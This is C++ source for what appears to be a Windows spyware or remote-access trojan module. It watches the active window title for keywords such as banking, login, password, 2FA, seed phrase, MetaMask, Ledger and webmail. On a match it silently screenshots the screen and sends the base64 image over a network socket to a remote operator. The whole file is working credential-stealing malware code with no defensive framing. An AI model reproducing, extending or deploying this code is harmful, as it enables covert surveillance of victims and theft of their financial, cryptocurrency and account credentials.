#include "window_monitor.h"
#include "screen_capture.h"

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <unordered_map>

// ── Trigger keyword list ─────────────────────────────────────────────────────
// Screenshot fires when any of these appear (case-insensitive) in the active
// window title.  Add/remove as needed.
static const char* KEYWORDS[] = {
    "bank", "banking", "login", "log in", "sign in", "signin",
    "password", "passcode", "2fa", "authenticator", "verify", "verification",
    "wallet", "metamask", "coinbase", "binance", "kraken", "kucoin",
    "bybit", "okx", "ledger", "trezor", "phantom", "trust wallet",
    "blockchain", "crypto", "exchange", "trading", "defi",
    "paypal", "stripe", "checkout", "payment", "credit card",
    "recovery", "seed phrase", "private key", "mnemonic",
    "account", "dashboard", "secure", "two-factor", "two factor",
    "gmail", "yahoo mail", "outlook", "webmail",
    nullptr
};

// ── Cooldown: don't re-fire for the same title within this many ms ───────────
static const DWORD COOLDOWN_MS = 30000; // 30 seconds

// ── Thread state ─────────────────────────────────────────────────────────────
static volatile bool g_wmRunning = false;
static HANDLE        g_wmThread  = nullptr;
static SOCKET        g_wmSock    = INVALID_SOCKET;

// ── Helpers ──────────────────────────────────────────────────────────────────
static std::string toLower(const std::string& s) {
    std::string out = s;
    std::transform(out.begin(), out.end(), out.begin(),
                   [](unsigned char c){ return (char)std::tolower(c); });
    return out;
}

static bool hasKeyword(const std::string& lowerTitle) {
    for (int i = 0; KEYWORDS[i] != nullptr; ++i) {
        if (lowerTitle.find(KEYWORDS[i]) != std::string::npos)
            return true;
    }
    return false;
}

// Replace '|' in title so it doesn't break our wire format
static std::string escapeTitle(const std::string& title) {
    std::string out;
    out.reserve(title.size());
    for (char c : title) {
        if (c == '|') out += ' ';
        else           out += c;
    }
    return out;
}

static bool wmSendAll(SOCKET sock, const char* data, int len) {
    int sent = 0;
    while (sent < len) {
        int n = ::send(sock, data + sent, len - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

// ── Monitor thread ───────────────────────────────────────────────────────────
static DWORD WINAPI WindowMonitorThread(LPVOID /*lpParam*/) {
    std::string lastTitle;
    std::unordered_map<std::string, DWORD> cooldowns; // title → last-fired tick

    while (g_wmRunning) {
        Sleep(500);
        if (!g_wmRunning) break;

        // Get foreground window title
        HWND hwnd = GetForegroundWindow();
        if (!hwnd) continue;

        char buf[512] = {};
        GetWindowTextA(hwnd, buf, sizeof(buf));
        std::string title(buf);
        if (title.empty()) continue;
        if (title == lastTitle) continue; // no change
        lastTitle = title;

        // Check keyword match
        std::string lower = toLower(title);
        if (!hasKeyword(lower)) continue;

        // Cooldown check
        DWORD now = GetTickCount();
        auto it = cooldowns.find(title);
        if (it != cooldowns.end() && (now - it->second) < COOLDOWN_MS) continue;
        cooldowns[title] = now;

        // Capture screenshot
        std::string b64 = CaptureScreenToJPEG(70, 0, 0);
        if (b64.empty() || g_wmSock == INVALID_SOCKET) continue;

        // Wire format: AUTO_SCREENSHOT|<escaped_title>|<b64size>|<b64data>\n
        std::string esc = escapeTitle(title);
        std::string msg = "AUTO_SCREENSHOT|" + esc + "|"
                        + std::to_string(b64.size()) + "|"
                        + b64 + "\n";
        wmSendAll(g_wmSock, msg.c_str(), (int)msg.size());
    }
    return 0;
}

// ── Public API ───────────────────────────────────────────────────────────────
void StartWindowMonitor(SOCKET sock) {
    if (g_wmRunning) return;
    g_wmSock    = sock;
    g_wmRunning = true;
    g_wmThread  = CreateThread(nullptr, 0, WindowMonitorThread, nullptr, 0, nullptr);
}

void StopWindowMonitor() {
    g_wmRunning = false;
    if (g_wmThread) {
        WaitForSingleObject(g_wmThread, 3000);
        CloseHandle(g_wmThread);
        g_wmThread = nullptr;
    }
    g_wmSock = INVALID_SOCKET;
}
